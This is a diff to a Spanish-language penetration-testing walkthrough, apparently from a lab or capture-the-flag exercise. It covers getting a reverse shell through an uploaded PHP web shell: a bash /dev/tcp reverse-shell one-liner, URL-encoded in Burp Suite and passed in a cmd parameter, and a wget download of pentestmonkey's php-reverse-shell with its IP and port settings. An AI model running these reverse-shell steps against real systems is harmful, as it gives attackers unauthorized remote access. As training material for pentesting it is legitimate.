@@ -51,5 +51,48 @@ $ bash -c 'bash -i >& /dev/tcp/192.../443 0>&1'
 # esto asi, no nos sirve
 ```
 
-Podemos capturarlo con 
+Podemos capturarlo con Burp Suite:
 
+- En la sección de `Decoder`
+- Pegamos el comando : `bash -c 'bash -i >& /dev/tcp/192.../443 0>&1'`
+- En la parte del lado derecho seleccionamos `Encode as...` - `URL`
+- Nos entrega un resultado y eso lo pegamos en la URL: 
+
+```sh
+$ http://elsitioweb/uploads/pwned.php?cmd=AQUIELCOMANDODEBURPSUITE
+```
+
+Con esto tenemos la conexión con la máquina objetivo.
+
+### Plan B:
+
+Nos ahorramos todo esto y buscamos el repositorio en:
+
+`pentestmonkey/php-reverse-shell`
+
+Link: (pentestmonkey/php-reverse-shell)[https://github.com/pentestmonkey/php-reverse-shell]
+
+Nos traemos el archivo: `php-reverse-shell.php` con raw
+
+Y con:
+
+```sh
+$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+$ ls
+```
+
+Editamos el archivo:
+
+```php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127...';  // CHANGE THIS
+$port = 443;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
